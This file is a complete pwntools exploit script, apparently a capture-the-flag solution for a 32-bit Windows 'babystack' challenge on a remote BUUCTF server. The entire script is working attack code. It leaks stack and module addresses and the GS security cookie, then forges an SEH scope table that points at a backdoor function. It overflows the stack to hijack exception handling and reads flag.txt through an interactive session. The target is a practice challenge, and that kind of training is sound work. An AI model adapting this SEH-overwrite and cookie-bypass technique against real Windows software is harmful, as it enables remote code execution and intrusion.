from pwn import *

context.arch = 'i386' #32bit, amd64 -> 64bit

#p = process('./babystack.exe')
p = remote('node4.buuoj.cn', 26910)

def get_value(addr):
    p.recvuntil('Do you want to know more?')
    p.sendline('yes')
    p.recvuntil('Where do you want to know')
    p.sendline(str(addr))
    p.recvuntil('value is ')
    return int(p.recvline(), 16)

# some_information_from_ida_pro
main = 0x10b0
target = 0x139B
__security_cookie_offset = 0x4004
backdoor = 0x138D
handler = 0x1460

p.recvuntil('stack address =')
result = p.recvline()
stack_addr = int(result, 16)
ebp_addr = stack_addr + 0x9c

p.recvuntil('main address =')
result = p.recvline()
main_addr = int(result, 16)
backdoor_addr = main_addr - 0x10b0 + 0x138d

# leak GS_cookie
security_cookie = get_value(main_addr + 0x2f54)  # 0x4004 - 0x10b0 = 0x2f54
GS_cookie = security_cookie ^ (ebp_addr)
GS_COOKIE = get_value(stack_addr + 0x80)

#leak seh_next
seh_next_addr = ebp_addr - 0x10
seh_next = get_value(seh_next_addr)

#leak except_handler
except_handler_addr = ebp_addr - 0xc
except_handler = get_value(except_handler_addr)

# make_the_fake_scope_table
fake_scope_table = p32(0x0FFFFFFE4)     #GSCookieOffset
fake_scope_table += p32(0)              #GSCookieXOROffset
fake_scope_table += p32(0x0FFFFFF20)    #EHCookieOffset
fake_scope_table += p32(0)              #EHCookieXOROffset
fake_scope_table += p32(0x0FFFFFFFE)    #ScopeRecord.EnclosingLevel
fake_scope_table += p32(backdoor_addr)  #ScopeRecord.FilterFunc
#fake_scope_table += p32(backdoor_addr)  #ScopeRecord.HandlerFunc

fake_scope_table_addr = stack_addr + 0x10

payload  = b'a' * 0x10
payload += fake_scope_table
payload = payload.ljust(0x9c - 0x1c, b'b')  #padding

payload += p32(GS_COOKIE)
#payload += p32(GS_cookie)   
payload += b'a' * 0x8
payload += p32(seh_next) 
payload += p32(except_handler) 
payload += p32(fake_scope_table_addr ^ security_cookie) 
#payload += p32(0)


p.sendline('n')
p.sendline(payload)
p.recvline()
p.sendline('yes')
p.recvuntil('Where do you want to know')
p.sendline('0')



p.sendline('type flag.txt')
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())

p.interactive()